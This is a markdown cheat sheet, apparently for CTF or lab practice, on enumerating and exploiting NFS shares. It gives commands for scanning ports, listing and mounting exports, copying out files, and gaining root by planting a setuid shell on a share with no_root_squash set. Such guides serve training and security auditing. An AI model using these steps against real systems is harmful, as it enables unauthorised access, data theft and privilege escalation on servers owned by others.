### 🔍 **1. NFS Enumeration**

#### Check NFS Ports (usually 2049/tcp)

```bash
nmap -p 111,2049 -sV -sC 10.10.X.X
```

####  List NFS Exports

```bash
showmount -e 10.10.X.X
```

> Output example:

```
Export list for 10.10.X.X:
/share        *
/confidential 10.10.0.0/24
```

---

###  **2. Mounting NFS Share**

####  Create a mount directory

```bash
mkdir -p ~/nfs_mount
```

####  Mount the remote share

```bash
sudo mount -t nfs 10.10.X.X:/share ~/nfs_mount
```

####  NFSv4 Mount (if v3 fails)

```bash
sudo mount -t nfs4 10.10.X.X:/ ~/nfs_mount
# Then access subdirs like: ~/nfs_mount/confidential
```

####  Unmount when done

```bash
sudo umount ~/nfs_mount
```

---

###  **3. Useful Enumeration Commands After Mount**

```bash
ls -la ~/nfs_mount
find ~/nfs_mount -type f -name "*.txt"
find ~/nfs_mount -perm -4000 2>/dev/null   # Look for SUID binaries
strings ~/nfs_mount/filename               # Inspect files
```

---

###  **4. Downloading Files from NFS**

Once mounted, just copy files as if local:

```bash
cp ~/nfs_mount/flag.txt .
cp -r ~/nfs_mount/secrets/ .
```

---

###  **5. Exploitation Tricks**

####  Writable Share? Create file to test:

```bash
touch ~/nfs_mount/testfile.txt
```

If it works, the share is **writable** — big opportunity for escalation!

#### 🐚 Privilege Escalation (Writable + Root Squash Disabled)

1. On your machine (must be **same UID/GID** as target):

```bash
sudo chown 0:0 ./shell
chmod +s ./shell
cp ./shell ~/nfs_mount/
```

2. On the target machine, run the setuid shell for root shell:

```bash
./shell
```

✅ Exploits `no_root_squash` misconfig.

---

###  **6. Clean Up**

```bash
sudo umount ~/nfs_mount
rm -rf ~/nfs_mount
```

---

## 🧠 Quick Notes:

|Term|Meaning|
|---|---|
|`no_root_squash`|Dangerous: lets NFS clients act as root on server|
|`root_squash`|Default: remaps root to nobody user|
|`/etc/exports`|NFS export configuration on server|
|Port `2049`|NFS main service|
|Port `111`|Portmapper (RPC service)|

---
